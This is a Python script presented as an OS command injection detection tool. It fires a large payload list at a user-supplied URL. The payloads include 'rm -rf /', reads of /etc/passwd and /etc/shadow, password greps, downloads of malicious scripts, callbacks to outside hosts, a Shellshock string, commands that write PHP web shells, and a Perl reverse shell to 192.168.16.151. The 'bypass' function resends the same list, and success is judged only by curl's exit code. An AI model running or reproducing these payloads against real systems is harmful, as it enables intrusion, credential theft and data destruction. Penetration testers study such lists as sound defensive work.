import subprocess

# Function to perform OS Command Injection detection
def detect_os_command_injection(target_url):
    print("Detecting OS Command Injection vulnerabilities...")
    # Define OS Command Injection payloads
    payloads = [
        ";ls", ";cat /etc/passwd", "| ls", "$(ls)", "$(cat /etc/passwd)", "|whoami", ";id", "|id", ";uname -a", 
        "|uname -a", ";echo test", "|echo test", ";which curl", "|which curl", ";ls -la", "|ls -la", ";ps aux", 
        "|ps aux", ";netstat -tuln", "|netstat -tuln", ";df -h", "|df -h", ";uptime", "|uptime", ";date", "|date", 
        ";ifconfig", "|ifconfig", ";hostname", "|hostname", ";echo 'hello'", "|echo 'hello'", 
        ";wget http://example.com/malicious_script.sh", "|wget http://example.com/malicious_script.sh", 
        ";curl http://example.com/malicious_script.sh -o malicious_script.sh", 
        "|curl http://example.com/malicious_script.sh -o malicious_script.sh", ";rm -rf /", ";rm -rf /", 
        ";rm -rf /*", "|rm -rf /*", ";cat /proc/cpuinfo", "|cat /proc/cpuinfo", ";cat /proc/meminfo", 
        "|cat /proc/meminfo", ";cat /etc/hosts", "|cat /etc/hosts", ";cat /etc/passwd | grep root", 
        "|cat /etc/passwd | grep root", ";find / -type f -name '*.log'", "|find / -type f -name '*.log'", 
        ";find / -type f -name '*.conf'", "|find / -type f -name '*.conf'", ";find / -type f -name '*.xml'", 
        "|find / -type f -name '*.xml'", ";find / -type f -name '*.json'", "|find / -type f -name '*.json'", 
        ";cat /etc/shadow", "|cat /etc/shadow", ";mysql --version", "|mysql --version", ";psql --version", 
        "|psql --version", ";python --version", "|python --version", ";perl --version", "|perl --version", 
        ";ruby --version", "|ruby --version", ";gcc --version", "|gcc --version", ";java --version", 
        "|java --version", ";ping -c 4 google.com", "|ping -c 4 google.com", ";touch testfile", "|touch testfile", 
        ";chmod 777 testfile", "|chmod 777 testfile", ";echo '<?php phpinfo(); ?>' > testfile.php", 
        "|echo '<?php phpinfo(); ?>' > testfile.php", ";cat testfile.php", "|cat testfile.php", ";rm testfile.php", 
        "|rm testfile.php", ";grep -R 'password' /", "|grep -R 'password' /", ";grep -R 'password' /etc/", 
        "|grep -R 'password' /etc/", ";tail -n 10 /var/log/syslog", "|tail -n 10 /var/log/syslog", 
        ";tail -n 10 /var/log/messages", "|tail -n 10 /var/log/messages", ";tail -n 10 /var/log/auth.log", 
        "|tail -n 10 /var/log/auth.log", ";tail -n 10 /var/log/dmesg", "|tail -n 10 /var/log/dmesg", 
        ";tail -n 10 /var/log/boot.log", "|tail -n 10 /var/log/boot.log", ";tail -n 10 /var/log/kern.log", 
        "|tail -n 10 /var/log/kern.log", ";tail -n 10 /var/log/lastlog", "|tail -n 10 /var/log/lastlog", 
        ";tail -n 10 /var/log/wtmp", "|tail -n 10 /var/log/wtmp", ";tail -n 10 /var/log/btmp", 
        "|tail -n 10 /var/log/btmp", ";grep -R 'root' /etc/passwd", "|grep -R 'root' /etc/passwd", 
        ";grep -R 'admin' /etc/passwd", "|grep -R 'admin' /etc/passwd", ";grep -R '123456' /etc/passwd", 
        "|grep -R '123456' /etc/passwd", ";grep -R 'password' /etc/shadow", "|grep -R 'password' /etc/shadow", 
        ";grep -R 'admin' /etc/shadow", "|grep -R 'admin' /etc/shadow", ";grep -R '123456' /etc/shadow", 
        "|grep -R '123456' /etc/shadow", "||", "|", ";", "'", "\"", "\"'", "\"\"", "&", "&&", "%%0a", "%%0a%%0d", "%0Aid", "%%0a id %%0a", "%0Aid%0A", "%%0a ping -i 30 127.0.0.1 %%0a", "%0A/usr/bin/id", "%0A/usr/bin/id%0A", "%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1", "%20{${phpinfo()}}", "%20{${sleep(20)}}", "%20{${sleep(3)}}", "a|id|", "a;id|", "a;id;", "a;id\n", "() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12", "| curl http://crowdshield.com/.testing/rce.txt", "& curl http://crowdshield.com/.testing/rce.txt", "; curl https://crowdshield.com/.testing/rce_vuln.txt", "&& curl https://crowdshield.com/.testing/rce_vuln.txt", "curl https://crowdshield.com/.testing/rce_vuln.txt", " curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt", "curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt", "$(curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn)", "dir", "| dir", "; dir", "$(dir)", "& dir", "&&dir", "&& dir", "| dir C:\\", "; dir C:\\", "& dir C:\\", "&& dir C:\\", "dir C:\\", "| dir C:\\Documents and Settings\\*", "; dir C:\\Documents and Settings\\*", "& dir C:\\Documents and Settings\\*", "&& dir C:\\Documents and Settings\\*", "dir C:\\Documents and Settings\\*", "| dir C:\\Users", "; dir C:\\Users", "& dir C:\\Users", "&& dir C:\\Users", "dir C:\\Users", ";echo%20'<script>alert(1)</script>'", "echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX", "| echo \"<?php include($_GET['page'])| ?>\" > rfi.php", "; echo \"<?php include($_GET['page']); ?>\" > rfi.php", "& echo \"<?php include($_GET['page']); ?>\" > rfi.php", "&& echo \"<?php include($_GET['page']); ?>\" > rfi.php", "echo \"<?php include($_GET['page']); ?>\" > rfi.php", "| echo \"<?php system('dir $_GET['dir']')| ?>\" > dir.php", "; echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php", "& echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php", "&& echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php", "echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php", ";echo '<script>alert(1)</script>'", "echo '<script>alert(1)</script>'// XXXXXXXXXXX", "echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX", "| echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">;S\");open(STDOUT,\">;S\");open(STDERR,\">;S\");exec(\"/bin/sh -i\");}\" > rev.pl", "; echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">;S\");open(STDOUT,\">;S\");open(STDERR,\">;S\");exec(\"/bin/sh -i\");}\" > rev.pl", "& echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}\" > rev.pl", "&& echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}\" > rev.pl", "echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}\" > rev.pl", "() { :;}; echo vulnerable 10", "eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')"

    ]

    # Iterate over payloads and inject them into vulnerable parameters
    for payload in payloads:
        print(f"Testing payload: {payload}")
        url = f"{target_url}?param={payload}"
        response = subprocess.run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "-X", "POST", url], capture_output=True, text=True)
        if response.returncode == 0:
            print(f"Payload ran successfully. URL: {url}, Response Code: {response.stdout}")
        else:
            print(f"Payload failed to execute. URL: {url}, Response Code: {response.stdout}")

# Function to attempt bypassing protection systems
def bypass_protection_systems(target_url):
    print("Attempting to bypass protection systems...")
    # Define bypass techniques
    bypass_techniques = [
        ";ls", ";cat /etc/passwd", "| ls", "$(ls)", "$(cat /etc/passwd)", "|whoami", ";id", "|id", ";uname -a", 
        "|uname -a", ";echo test", "|echo test", ";which curl", "|which curl", ";ls -la", "|ls -la", ";ps aux", 
        "|ps aux", ";netstat -tuln", "|netstat -tuln", ";df -h", "|df -h", ";uptime", "|uptime", ";date", "|date", 
        ";ifconfig", "|ifconfig", ";hostname", "|hostname", ";echo 'hello'", "|echo 'hello'", 
        ";wget http://example.com/malicious_script.sh", "|wget http://example.com/malicious_script.sh", 
        ";curl http://example.com/malicious_script.sh -o malicious_script.sh", 
        "|curl http://example.com/malicious_script.sh -o malicious_script.sh", ";rm -rf /", ";rm -rf /", 
        ";rm -rf /*", "|rm -rf /*", "; cat""/proc/cpuinfo", "|cat /proc/cpuinfo", ";cat /proc/meminfo", 
        "|cat /proc/meminfo",";cat /etc/hosts", "|cat /etc/hosts", ";cat /etc/passwd | grep root", 
        "|cat /etc/passwd | grep root", ";find / -type f -name '*.log'", "|find / -type f -name '*.log'", 
        ";find / -type f -name '*.conf'", "|find / -type f -name '*.conf'", ";find / -type f -name '*.xml'", 
        "|find / -type f -name '*.xml'", ";find / -type f -name '*.json'", "|find / -type f -name '*.json'", 
        ";cat /etc/shadow", "|cat /etc/shadow", ";mysql --version", "|mysql --version", ";psql --version", 
        "|psql --version", ";python --version", "|python --version", ";perl --version", "|perl --version", 
        ";ruby --version", "|ruby --version", ";gcc --version", "|gcc --version", ";java --version", 
        "|java --version", ";ping -c 4 google.com", "|ping -c 4 google.com", ";touch testfile", "|touch testfile", 
        ";chmod 777 testfile", "|chmod 777 testfile", ";echo '<?php phpinfo(); ?>' > testfile.php", 
        "|echo '<?php phpinfo(); ?>' > testfile.php", ";cat testfile.php", "|cat testfile.php", ";rm testfile.php", 
        "|rm testfile.php", ";grep -R 'password' /", "|grep -R 'password' /", ";grep -R 'password' /etc/", 
        "|grep -R 'password' /etc/", ";tail -n 10 /var/log/syslog", "|tail -n 10 /var/log/syslog", 
        ";tail -n 10 /var/log/messages", "|tail -n 10 /var/log/messages", ";tail -n 10 /var/log/auth.log", 
        "|tail -n 10 /var/log/auth.log", ";tail -n 10 /var/log/dmesg", "|tail -n 10 /var/log/dmesg", 
        ";tail -n 10 /var/log/boot.log", "|tail -n 10 /var/log/boot.log", ";tail -n 10 /var/log/kern.log", 
        "|tail -n 10 /var/log/kern.log", ";tail -n 10 /var/log/lastlog", "|tail -n 10 /var/log/lastlog", 
        ";tail -n 10 /var/log/wtmp", "|tail -n 10 /var/log/wtmp", ";tail -n 10 /var/log/btmp", 
        "|tail -n 10 /var/log/btmp", ";grep -R 'root' /etc/passwd", "|grep -R 'root' /etc/passwd", 
        ";grep -R 'admin' /etc/passwd", "|grep -R 'admin' /etc/passwd", ";grep -R '123456' /etc/passwd", 
        "|grep -R '123456' /etc/passwd", ";grep -R 'password' /etc/shadow", "|grep -R 'password' /etc/shadow", 
        ";grep -R 'admin' /etc/shadow", "|grep -R 'admin' /etc/shadow", ";grep -R '123456' /etc/shadow", 
        "|grep -R '123456' /etc/shadow"
    ]

    # Iterate over bypass techniques and inject them into vulnerable parameters
    for bypass in bypass_techniques:
        print(f"Testing bypass technique: {bypass}")
        url = f"{target_url}?param={bypass}"
        response = subprocess.run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "-X", "POST", url], capture_output=True, text=True)
        if response.returncode == 0:
            print(f"Bypass successful. URL: {url}, Response Code: {response.stdout}")
        else:
            print(f"Bypass failed. URL: {url}, Response Code: {response.stdout}")

def main():
    print("OS Command Injection Detection Tool")

    # Prompt user for target URL
    target_url = input("Enter your target URL: ")

    # Validate input
    if not target_url:
        print("Target URL cannot be empty.")
        return

    # Perform OS Command Injection detection
    detect_os_command_injection(target_url)

    # Attempt to bypass protection systems
    bypass_protection_systems(target_url)

if __name__ == "__main__":
    main()


